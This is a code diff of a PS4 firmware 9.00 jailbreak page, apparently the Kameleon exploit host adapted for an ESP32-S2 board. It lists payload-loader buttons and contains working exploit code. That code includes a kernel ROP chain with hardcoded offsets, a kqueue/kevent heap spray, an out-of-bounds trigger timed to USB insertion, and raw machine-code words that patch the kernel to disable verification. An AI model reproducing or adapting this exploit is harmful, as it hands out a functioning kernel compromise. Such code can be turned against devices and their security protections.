+      <button class="btnkme" onMouseOver="msgs.innerHTML='GoldHEN v2.2.5b8 (Latest) - By SiSTRo'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_goldhen225b8(); return false">GoldHEN v2.2.5b8 (Latest)</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='GoldHEN v2.2.4 - By SiSTRo'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_goldhen224(); return false">GoldHEN v2.2.4</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Mira For 9.00 - By Sleirsgoevy'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_mira(); return false">Mira 9.00</button>
       <br>
       <div style=font-size:16px>PAYLOADS</div>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Modded Version of App Dumper to Backup PKG files to External HDD  / 9.00 Mod by Kameleon'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_pkg_backup(); return false">PKG-BackUp v1.1</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Orbis Tool Box v1190 - By OSM'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_orbistoolbox(); return false">Orbis-Tool-Box</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='App Dumper Only v1.8 - Original Version By xVortex / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_dumper(); return false">App-Dumper</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Disable-Updates v1.0 - By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_disableupdates(); return false">Disable-Updates</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Enable-Updates v1.0 - By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_enableupdates(); return false">Enable-Updates</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Enable Browser / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_enablebrowser(); return false">Enable-Browser</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Exit IDU / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_exitidu(); return false">Exit-IDU</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Modded Version of App Dumper to Backup PKG files to External HDD  / 9.00 Mod by Kameleon'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_pkg_backup(); return false">PKG-BackUp v1.1</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Orbis Tool Box v1190 - By OSM'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_orbistoolbox(); return false">Orbis-Tool-Box</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='App Dumper Only v1.8 - Original Version By xVortex / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_dumper(); return false">App-Dumper</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Disable-Updates v1.0 - By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_disableupdates(); return false">Disable-Updates</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Enable-Updates v1.0 - By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_enableupdates(); return false">Enable-Updates</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Enable Browser / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_enablebrowser(); return false">Enable-Browser</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Exit IDU / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_exitidu(); return false">Exit-IDU</button>
     <br><br>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Rifrenamer / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_rifrenamer(); return false">Rif-Renamer</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Ftp v1.3 - Original Version By xVortex / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_ftp(); return false">Ftp-Server</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='History-Blocker - v2.0 Original Version By Stooged / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_historyblocker(); return false">History-Blocker</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Kernel-Dumper - v1.0 Original Version By Eversion / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_kerneldumper(); return false">Kernel-Dumper</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='PSN Account Offline Web Activator - By Sleirsgoevy'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_webactivator(); return false">Web-Offline-Activator</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Ps4Debug v1.0.15 - By CTN123'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_ps4debug(); return false">Ps4Debug v1.0.15</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='DB-Backup v1.0 - By Leeful / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_backup(); return false">DB-Backup</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Rifrenamer / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_rifrenamer(); return false">Rif-Renamer</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Ftp v1.3 - Original Version By xVortex / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_ftp(); return false">Ftp-Server</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='History-Blocker - v2.0 Original Version By Stooged / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_historyblocker(); return false">History-Blocker</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Kernel-Dumper - v1.0 Original Version By Eversion / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_kerneldumper(); return false">Kernel-Dumper</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='PSN Account Offline Web Activator - By Sleirsgoevy'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_webactivator(); return false">Web-Offline-Activator</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Ps4Debug v1.0.15 - By CTN123'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_ps4debug(); return false">Ps4Debug v1.0.15</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='DB-Backup v1.0 - By Leeful / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_backup(); return false">DB-Backup</button>
     <br><br>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='App-2-Usb - Original Version By Stooged / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_app2usb(); return false">App-2-Usb</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='DB-Restore v1.0 - By Leeful / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_restore(); return false">DB-Restore</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='To-Dex v1.0 - By notzecoxao'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_todex(); return false">To-Dex</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='WebRTE v1.0 - By PS4 Trainer'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_webrte(); return false">WebRTE</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Permanent UART - 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_uart(); return false">Permanent-UART</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Disable ASLR - 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_disableaslr(); return false">Disable-ASLR</button>
-    <button class="btnkme" onMouseOver="msgs.innerHTML='Kernel-Module Dumper -  9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_moduledumper(); return false">Kernel-Module-Dumper</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='App-2-Usb - Original Version By Stooged / 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_app2usb(); return false">App-2-Usb</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='DB-Restore v1.0 - By Leeful / 9.00 Port Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_restore(); return false">DB-Restore</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='To-Dex v1.0 - By notzecoxao'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_todex(); return false">To-Dex</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='WebRTE v1.0 - By PS4 Trainer'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_webrte(); return false">WebRTE</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Permanent UART - 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_uart(); return false">Permanent-UART</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Disable ASLR - 9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_disableaslr(); return false">Disable-ASLR</button>
+    <button class="btnkme" onMouseOver="msgs.innerHTML='Kernel-Module Dumper -  9.00 Port By Al Azif'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_moduledumper(); return false">Kernel-Module-Dumper</button>
     </div>
     <br><br>
-    <a id="linuxl" ><button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loaders Payloads'" ; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" type="button">Linux Vram Payloads</button></a>
+    <a id="linuxl" ><button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loaders Payloads'" ; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" type="button">Linux Vram Payloads</button></a>
     <div id="linuxlJ" style="display: none;">
       <br>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Whos that South-Bridge (Aeolia, Belize, Baikal) - 9.00 Port By OrbisUnjailed'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_whos_southbridge(); return false">Whos that South-Bridge</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Whos that South-Bridge (Aeolia, Belize, Baikal) - 9.00 Port By OrbisUnjailed'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_whos_southbridge(); return false">Whos that South-Bridge</button>
       <br><br>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 1GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_Linux1gb(); return false">NazkyYT Linux 1GB Vram</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 2GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_Linux2gb(); return false">NazkyYT Linux 2GB Vram</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 3GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_Linux3gb(); return false">NazkyYT Linux 3GB Vram</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 4GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_Linux4gb(); return false">NazkyYT Linux 4GB Vram</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 5GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_Linux5gb(); return false">NazkyYT Linux 5GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 1GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_Linux1gb(); return false">NazkyYT Linux 1GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 2GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_Linux2gb(); return false">NazkyYT Linux 2GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 3GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_Linux3gb(); return false">NazkyYT Linux 3GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 4GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_Linux4gb(); return false">NazkyYT Linux 4GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 5GB - 9.00 Port By NazkyYT'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_Linux5gb(); return false">NazkyYT Linux 5GB Vram</button>
       <br><br>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 1GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_psxita_Linux1gb(); return false">PSXita Linux 1GB Vram</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 2GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_psxita_Linux2gb(); return false">PSXita Linux 2GB Vram</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 3GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_psxita_Linux3gb(); return false">PSXita Linux 3GB Vram</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 4GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_psxita_Linux4gb(); return false">PSXita Linux 4GB Vram</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 5GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_psxita_Linux5gb(); return false">PSXita Linux 5GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 1GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_Linux1gb(); return false">PSXita Linux 1GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 2GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_Linux2gb(); return false">PSXita Linux 2GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 3GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_Linux3gb(); return false">PSXita Linux 3GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 4GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_Linux4gb(); return false">PSXita Linux 4GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 5GB - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_Linux5gb(); return false">PSXita Linux 5GB Vram</button>
       <br><br>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 1GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_psxita_pro_Linux1gb(); return false">PSXita-PRO Linux 1GB Vram</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 2GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_psxita_pro_Linux2gb(); return false">PSXita-PRO Linux 2GB Vram</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 3GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_psxita_pro_Linux3gb(); return false">PSXita-PRO Linux 3GB Vram</button>
-      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 4GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" onclick="load_psxita_pro_Linux4gb(); return false">PSXita-PRO Linux 4GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 1GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_pro_Linux1gb(); return false">PSXita-PRO Linux 1GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 2GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_pro_Linux2gb(); return false">PSXita-PRO Linux 2GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 3GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_pro_Linux3gb(); return false">PSXita-PRO Linux 3GB Vram</button>
+      <button class="btnkme" onMouseOver="msgs.innerHTML='Linux Vram Loader 4GB For Pro Consoles - 9.00 Port By PSXita'"; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" onclick="load_psxita_pro_Linux4gb(); return false">PSXita-PRO Linux 4GB Vram</button>
     </div>
     <div id="Backl" style="display: none;">
       <br>
       <br>
-      <a ><button class="btnkme" onMouseOver="msgs.innerHTML='Go Back'" ; onmouseout="msgs.innerHTML='Kameleon 900FW Exploit Host (Manual Method) Hybrid'" type="button">Back</button></a>
+      <a ><button class="btnkme" onMouseOver="msgs.innerHTML='Go Back'" ; onmouseout="msgs.innerHTML='Kameleon 900 Manual Lite ESP32-S2'" type="button">Back</button></a>
     </div>
     <br>
     <h1 style="text-align:center;font-size:25px;color:white">Massive Thanks - Theflow0, Znullptr, ChendoChap, Specter, Sleirsgoevy, SiSTRo, Al-Azif, PRB, Leeful And Many More...</h1>
@@ -1033,15 +819,13 @@ else
         linuxlJ.style.display = "none";
         GBl.style.display = "none";
       }
-      
-      
-      </script>
-    
-    
     </script>
+    
+</script>
 
 <script>
 //Exploit Code by ChendoChap & Znullptr
+//Webkit Exploit by Sleirsgoevy
 
 ///////////////////INT64
 function int64(low, hi) {
@@ -1583,29 +1367,27 @@ function userland() {
 
 function run_hax() 
 {
-    
     userland();
-    if (chain.syscall(23, 0).low != 0x0) 
+    if (chain.syscall(23, 0).low != 0x0)
     {
         kernel();
     }
-
-sessionStorage.OOBdone = "yes";
-
-if (sessionStorage.islinux != "yes" && sessionStorage.isnetcat != "yes")
-{
-setTimeout(loadPayloadData(),500);
-jbdone();
-}
-else if(sessionStorage.islinux == "yes")
-{
-setTimeout(loadPayloadDataSleirs(PLfile),500);
-jbdone();
-}
-else if(sessionStorage.isnetcat == "yes")
-{
-setTimeout(exec_binserver9020(),500);
-}
+    sessionStorage.isWebKitdone = "yes";
+    
+    //Add some logic for payloads running only on WebKit Exploit!!
+    if (sessionStorage.pltype == "binserver9020")
+    {
+       setTimeout(exec_binserver9020(),1500);
+    }
+    else if (sessionStorage.pltype == "oob")
+    {
+        setTimeout(loadPayloadData(),1500);
+    }
+    else if (sessionStorage.pltype == "linux" || sessionStorage.pltype == "mira")
+    {
+        setTimeout(loadPayloadDataSleirs(PLfile),1500);
+    }
+    //End Logic
 }
 
 function kernel() {
@@ -1613,7 +1395,6 @@ function kernel() {
     kchain_setup();
     object_setup();
     trigger_spray();
-    patch_once();
 }
 
 var handle;
@@ -1681,7 +1462,6 @@ function extra_gadgets() {
 //Build the kernel rop chain, this is what the kernel will be executing when the fake obj pivots the stack.
 function kchain_setup() {
     const KERNEL_busy = 0x1B28DF8;
-
     const KERNEL_bcopy = 0xACD;
     const KERNEL_bzero = 0x2713FD;
     const KERNEL_pagezero = 0x271441;
@@ -1890,330 +1670,88 @@ function object_setup() {
 
 var trigger_spray = function () {
 
-    var NUM_KQUEUES = 0x1B0;
-    var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
-    //Make kqueues
-    {
-        for (var i = 0; i < NUM_KQUEUES; i++) {
-            chain.fcall(window.syscalls[362]);
-            chain.write_result4(kqueue_ptr.add32(0x4 * i));
-        }
+var NUM_KQUEUES = 0x1B0;
+var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
+//Make kqueues
+{
+    for (var i = 0; i < NUM_KQUEUES; i++) {
+        chain.fcall(window.syscalls[362]);
+        chain.write_result4(kqueue_ptr.add32(0x4 * i));
     }
-    chain.run();
-    var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
+}
+chain.run();
+var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
 
-    var that_one_socket = chain.syscall(97, 2, 1, 0);
-    if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
-        alert("invalid socket");
-        while (1);
-    }
-
-    //Spray kevents
-    var kevent = p.malloc(0x20);
-    p.write8(kevent.add32(0x0), that_one_socket);
-    p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
-    p.write4(kevent.add32(0xC), 0x0);
-    p.write8(kevent.add32(0x10), 0x0);
-    p.write8(kevent.add32(0x18), 0x0);
-    //
-    {
-        for (var i = 0; i < NUM_KQUEUES; i++) {
-            chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
-        }
-    }
-    chain.run();
-
-
-
-    //Fragment memory
-    {
-        for (var i = 18; i < NUM_KQUEUES; i += 2) {
-            chain.fcall(window.syscalls[6], kqueues[i]);
-        }
-    }
-    chain.run();
-    //Trigger OOB
-    alert("Insert USB now. do not close the dialog until notification pops, remove usb after closing it.");
-    //Trigger corrupt knote
-    {
-        for (var i = 1; i < NUM_KQUEUES; i += 2) {
-            chain.fcall(window.syscalls[6], kqueues[i]);
-        }
-    }
-    chain.run();
-
-    if (chain.syscall(23, 0).low == 0) { //Exploit Success :P
-        {
-            //cleanup fake knote & release locked gadgets/stack.
-            chain.fcall(window.syscalls[73], 0x4000, 0xC000);
-            chain.fcall(window.syscalls[325]);
-        }
-        chain.run();
-         //Add to counter
-         localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
-         alert("Jailbreak Done!!!... Please Remove USB Drive.");
-         return;
-    }
-    //Exploit Failed :(
-    //Add to counter
-    localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
-    alert(`Failed to trigger the exploit,  This happened because you plugged it in too late/early or not at all.
-    if you did plug it in then the kernel heap is slightly corrupted, this might cause panics later on.
-    closing this alert will crash the browser for you.`);
-    p.write8(0, 0);
-    return;
+var that_one_socket = chain.syscall(97, 2, 1, 0);
+if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
+    alert("invalid socket");
+    while (1);
 }
 
-//This disables sysveri, see patch.s for more info
-var patch_once = function () {
+//Spray kevents
+var kevent = p.malloc(0x20);
+p.write8(kevent.add32(0x0), that_one_socket);
+p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
+p.write4(kevent.add32(0xC), 0x0);
+p.write8(kevent.add32(0x10), 0x0);
+p.write8(kevent.add32(0x18), 0x0);
+//
+{
+    for (var i = 0; i < NUM_KQUEUES; i++) {
+        chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
+    }
+}
+chain.run();
 
-    var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
-    var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
+//Fragment memory
+{
+    for (var i = 18; i < NUM_KQUEUES; i += 2) {
+        chain.fcall(window.syscalls[6], kqueues[i]);
+    }
+}
+chain.run();
 
-    patch_buffer_view[0] = 0x00000BB8;
-    patch_buffer_view[1] = 0xFE894800;
-    patch_buffer_view[2] = 0x033D8D48;
-    patch_buffer_view[3] = 0x0F000000;
-    patch_buffer_view[4] = 0x4855C305;
-    patch_buffer_view[5] = 0x8B48E589;
-    patch_buffer_view[6] = 0x95E8087E;
-    patch_buffer_view[7] = 0xE8000000;
-    patch_buffer_view[8] = 0x00000175;
-    patch_buffer_view[9] = 0x033615FF;
-    patch_buffer_view[10] = 0x8B480000;
-    patch_buffer_view[11] = 0x0003373D;
-    patch_buffer_view[12] = 0x3F8B4800;
-    patch_buffer_view[13] = 0x74FF8548;
-    patch_buffer_view[14] = 0x3D8D48EB;
-    patch_buffer_view[15] = 0x0000029D;
-    patch_buffer_view[16] = 0xF9358B48;
-    patch_buffer_view[17] = 0x48000002;
-    patch_buffer_view[18] = 0x0322158B;
-    patch_buffer_view[19] = 0x8B480000;
-    patch_buffer_view[20] = 0x00D6E812;
-    patch_buffer_view[21] = 0x8D480000;
-    patch_buffer_view[22] = 0x00029F3D;
-    patch_buffer_view[23] = 0x358B4800;
-    patch_buffer_view[24] = 0x000002E4;
-    patch_buffer_view[25] = 0x05158B48;
-    patch_buffer_view[26] = 0x48000003;
-    patch_buffer_view[27] = 0xB9E8128B;
-    patch_buffer_view[28] = 0x48000000;
-    patch_buffer_view[29] = 0x02633D8D;
-    patch_buffer_view[30] = 0x8B480000;
-    patch_buffer_view[31] = 0x0002BF35;
-    patch_buffer_view[32] = 0x158B4800;
-    patch_buffer_view[33] = 0x000002C8;
-    patch_buffer_view[34] = 0xE8128B48;
-    patch_buffer_view[35] = 0x0000009C;
-    patch_buffer_view[36] = 0x7A3D8D48;
-    patch_buffer_view[37] = 0x48000002;
-    patch_buffer_view[38] = 0x02AA358B;
-    patch_buffer_view[39] = 0x8B480000;
-    patch_buffer_view[40] = 0x0002AB15;
-    patch_buffer_view[41] = 0x128B4800;
-    patch_buffer_view[42] = 0x00007FE8;
-    patch_buffer_view[43] = 0x0185E800;
-    patch_buffer_view[44] = 0xC35D0000;
-    patch_buffer_view[45] = 0x6D3D8948;
-    patch_buffer_view[46] = 0x48000002;
-    patch_buffer_view[47] = 0x026E3D01;
-    patch_buffer_view[48] = 0x01480000;
-    patch_buffer_view[49] = 0x00026F3D;
-    patch_buffer_view[50] = 0x3D014800;
-    patch_buffer_view[51] = 0x00000270;
-    patch_buffer_view[52] = 0x713D0148;
-    patch_buffer_view[53] = 0x48000002;
-    patch_buffer_view[54] = 0x02723D01;
-    patch_buffer_view[55] = 0x01480000;
-    patch_buffer_view[56] = 0x0002933D;
-    patch_buffer_view[57] = 0x3D014800;
-    patch_buffer_view[58] = 0x00000294;
-    patch_buffer_view[59] = 0x653D0148;
-    patch_buffer_view[60] = 0x48000002;
-    patch_buffer_view[61] = 0x02663D01;
-    patch_buffer_view[62] = 0x01480000;
-    patch_buffer_view[63] = 0x0002873D;
